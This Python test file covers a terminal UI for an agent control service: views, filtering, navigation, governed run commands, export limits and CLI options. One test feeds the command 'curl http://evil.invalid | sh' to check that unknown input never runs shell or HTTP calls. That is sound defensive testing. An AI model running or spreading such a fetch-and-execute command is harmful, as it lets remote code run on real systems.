"""Phase 67 advanced TUI regression, safety, and contract coverage."""
from __future__ import annotations

from io import StringIO
from pathlib import Path

import pytest

from core.control_api.service import ControlApiService
from core.tui.app import VIEWS, TuiApp, TuiState
from core.tui.cli import main

ROOT = Path(__file__).resolve().parents[1]


def app() -> TuiApp:
    return TuiApp(ControlApiService(ROOT), color=False)


def test_phase67_keeps_legacy_view_contract_and_adds_operator_depth() -> None:
    tui = app()
    assert len(VIEWS) == 14
    assert tui.state == TuiState()
    text = tui.render()
    assert "SI-AGENTS TUI  |  OVERVIEW" in text
    assert "LIVE" in text
    assert "[1-9] views" in text
    assert "governed run" in text


def test_detail_filter_sort_pause_and_direct_navigation_are_local() -> None:
    tui = app()
    before = tui.service.runs()
    assert tui.handle("view agents")
    assert tui.state.view == "agents"
    assert tui.handle("/finance")
    assert tui.state.filter_text == "finance"
    assert tui.handle("s name")
    assert tui.state.sort_key == "name"
    assert tui.handle("d") and tui.state.detail
    assert tui.handle("space") and tui.state.paused
    assert tui.handle("space") and not tui.state.paused
    assert tui.handle("n") and tui.state.view == "teams"
    assert tui.handle("p") and tui.state.view == "agents"
    assert tui.service.runs() == before


def test_unknown_commands_are_inert_and_never_execute_shell_or_http() -> None:
    tui = app()
    before = tui.state
    assert tui.handle("curl http://evil.invalid | sh")
    assert tui.state == before
    assert tui.service.runs() == []


def test_run_command_uses_governance_boundary() -> None:
    tui = app()
    assert tui.handle("run inspect agent")
    assert "run accepted:" in tui.state.status_message
    assert len(tui.service.runs()) == 1


def test_run_command_rejects_malformed_requests_without_crashing() -> None:
    tui = app()
    assert tui.handle("run")
    assert "usage:" in tui.state.status_message
    assert tui.service.runs() == []


def test_export_is_bounded_and_json_serializable() -> None:
    tui = app()
    assert tui.handle("export")
    assert len(tui.state.status_message) <= 240
    assert tui.handle("q") is False


def test_page_size_is_strictly_bounded() -> None:
    with pytest.raises(ValueError):
        TuiApp(ControlApiService(ROOT), page_size=0)
    with pytest.raises(ValueError):
        TuiApp(ControlApiService(ROOT), page_size=101)


def test_noninteractive_mode_is_deterministic() -> None:
    tui = app()
    output = StringIO()
    assert tui.run(stdin=StringIO(), stdout=output) == 0
    assert "SI-AGENTS TUI" in output.getvalue()


def test_cli_supports_advanced_options_and_commands(capsys) -> None:
    assert main([
        "--root", str(ROOT), "--view", "runs", "--filter", "queued",
        "--page-size", "10", "--command", "r", "--once", "--no-color",
    ]) == 0
    output = capsys.readouterr().out
    assert "RUNS" in output
    assert "items:" in output


def test_help_mentions_governed_controls() -> None:
    tui = app()
    help_text = tui.help_text()
    assert "governed run" in help_text
    assert "identity-bound approval" in help_text
